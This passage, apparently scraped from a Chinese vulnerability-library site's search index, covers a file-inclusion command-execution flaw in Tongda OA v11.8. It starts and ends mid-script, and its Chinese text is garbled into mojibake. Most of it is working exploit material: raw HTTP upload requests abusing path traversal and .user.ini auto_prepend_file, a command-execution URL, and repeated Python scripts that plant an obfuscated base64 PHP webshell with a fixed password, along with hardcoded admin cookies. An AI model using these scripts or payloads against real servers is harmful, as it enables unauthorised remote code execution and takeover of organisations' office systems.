base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º†.user.iniÊñá‰ª∂, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º†.user.iniÊñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º† test.log Êñá‰ª∂, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º† test.log Êñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠ÂåÖÂê´ test_Wiki,Â≠òÂú®XSSÊºèÊ¥û, ÂèØÂèÇËÄÉÊñáÁ´†ÂÜôÁöÑÂà©Áî®ÁâàÊú¨Ëøõ‰∏ÄÊ≠•ÊîªÂáª \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠‰∏çÂåÖÂê´ test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1(target_url, Cookie) ÂèÇËÄÉÊñáÁ´† https://paper.seebug.org/1499/ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOA v11.8‰ª•‰∏ãÂ≠òÂú®Êñá‰ª∂‰∏ä‰º†Êé•Âè£ÔºåÂèØ‰∏ä‰º† .user.ini Êñá‰ª∂ÂåÖÂê´ÊúâPHPËØ≠Âè•ÁöÑÊñá‰ª∂ÂØºËá¥ÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈÄöËææOA ÁéØÂ¢ÉÊê≠Âª∫ ÈÄöËææOA v11.6‰∏ãËΩΩÈìæÊé• ‰∏ãËΩΩÂÆåÊØïÁÇπÂáªÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËøôÈáå‰ΩøÁî®ÁöÑÁéØÂ¢É‰∏∫ÈÄöËææ v11.6ÁâàÊú¨ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"ÈôÑ‰ª∂‰∏ä‰º†Â§±Ë¥•\"), _(\"ÂéüÂõ†ÔºöÈôÑ‰ª∂Êñá‰ª∂‰∏∫Á©∫ÊàñÊñá‰ª∂ÂêçÂ§™ÈïøÔºåÊàñÈôÑ‰ª∂Â§ß‰∫é30ÂÖÜÂ≠óËäÇÔºåÊàñÊñá‰ª∂Ë∑ØÂæÑ‰∏çÂ≠òÂú®ÔºÅ\")); Button_Back(); exit(); } } Âú®ËøôÈáåÂèÇÊï∞ $USER_ID ÊòØÂèØÊéßÁöÑÔºåÂπ∂‰∏îÊó†ËøáÊª§Âç±Èô©Á¨¶Âè∑Â∞±ÊãºÊé•ËøõÂéª‰∫ÜÔºåÈÇ£Êàë‰ª¨‰º†ÂÖ• ../../../ Êàë‰ª¨Â∞±ÂèØ‰ª•‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†‰∫Ü Áî±‰∫éÈÄöËææOA ÁöÑÊñá‰ª∂‰∏ä‰º†ÈôêÂà∂ÁöÑÊ≠ªÊ≠ªÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂà©Áî® PHPÁöÑ .user.ini Êñá‰ª∂Êù•ÂåÖÂê´ÂÖ∂‰ªñÊñá‰ª∂ÔºåËøôÈáåÊòØÂèØ‰ª•Áî®‰∫éÂåÖÂê´PHPËØ≠Âè•ÁöÑÊñá‰ª∂ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨‰∏ä‰º†Êñá‰ª∂ÂÜÖÂÆπ‰∏∫ auto_prepend_file=peiqi.log ËØ∑Ê±ÇÂåÖ‰∏∫ POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" Êèê‰∫§ -----------------------------17518323986548992951984057104-- ÂÖ∂‰∏≠ USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user ‰∏∫‰∏ä‰º†Ë∑ØÂæÑ ÂÖ≥‰∫éÊõ¥Â§öÂéüÁêÜÂèÇËÄÉ http://wiki.peiqi.tech ‰∏≠ÁöÑÂè¶‰∏ÄÁØá ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´Â≠òÂÇ®ÂûãXSSÊºèÊ¥û ËøôÈáåÊàë‰ª¨ÁÆÄÂçïÁü•ÈÅì‰∫Ü‰∏ä‰º†ÊñπÂºèÔºåÈÇ£Êàë‰ª¨Â∞±ÈÄöËøá .user.iniÊñá‰ª∂ ÂåÖÂê´ÊÅ∂ÊÑèÊñá‰ª∂ Áé∞Âú®Â∑≤ÁªèÊàêÂäü‰∏ä‰º†‰∫ÜÊÅ∂ÊÑèÊñá‰ª∂ ËÆøÈóÆ http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig Êñá‰ª∂ÂåÖÂê´ÂëΩ‰ª§ÊâßË°å [!NOTE] Âú® v11.6‰∏≠ ‰∏ä‰º†ÁöÑ‰ΩçÁΩÆÂπ∂Ê≤°ÊúâÈôêÂÆöÊâÄ‰ª•ÂèØ‰ª•‰∏ä‰º†Âú®Êñπ‰æøËÆøÈóÆÁöÑÁõÆÂΩï(‰∏çÈúÄË¶ÅÁôªÂΩï) ËÄå v11.8‰∏≠ÂàôÊúâÁõÆÂΩïÂêçÁöÑÈôêÂà∂ÈúÄË¶ÅÁõÆÂΩïÂ∏¶Êúâ webroot Âíå attachment ÊºèÊ¥ûÂà©Áî®POC [!NOTE] ËÑöÊú¨Âú® v11.6 ÊµãËØïÊàêÂäüÊâßË°åÔºå Âú® v11.6‰ª•‰∏äÊâßË°åÊó∂ Ëøô‰∏™webshellÊó†Ê≥ïÊâßË°åÂëΩ‰ª§ v11.7 v11.8ÂèØÁî®ËöÅÂâëÊèí‰ª∂ÁªïËøáËøûÊé•webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: ÈÄöËææOA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º†.user.iniÊñá‰ª∂, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º†.user.iniÊñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX3JvdDEzKCc5JykuY2hyKDAxNTUwNjQvMDEyMzEpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5zdHJfcm90MTMoJ1MnKS5iYXNlNjRfZGVjb2RlKCdkQT09JykuYmFzZTY0X2RlY29kZSgnTUE9PScpLmNocig2MDc1MC82NzUpLmNocigwMTUwNy0wMTM1NykuJycuJ04wWFNrJy4nN01UUTEnLidOek15TycuJ0RzPScuJycpKTs/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQo=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º† test.log Êñá‰ª∂, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º† test.log Êñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠ÂåÖÂê´ test_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÊàêÂäü‰∏ä‰º†ËöÅÂâëÊú®È©¨ ÂØÜÁ†Å‰∏∫: test \\n[o] webshellË∑ØÂæÑ: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠‰∏çÂåÖÂê´ test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) [!NOTE] v11.8Âèä‰ª•‰∏ãÂèØËøûÊé•ËöÅÂâëÁîüÊàêÁöÑwebshellÊéßÂà∂,‰∏îÁîüÊàêÂêé‰∏çÈúÄË¶ÅÁÆ°ÁêÜÂëòCookieÂç≥ÂèØËøûÊé• import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈÄöËææOA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º†.user.iniÊñá‰ª∂, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º†.user.iniÊñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if 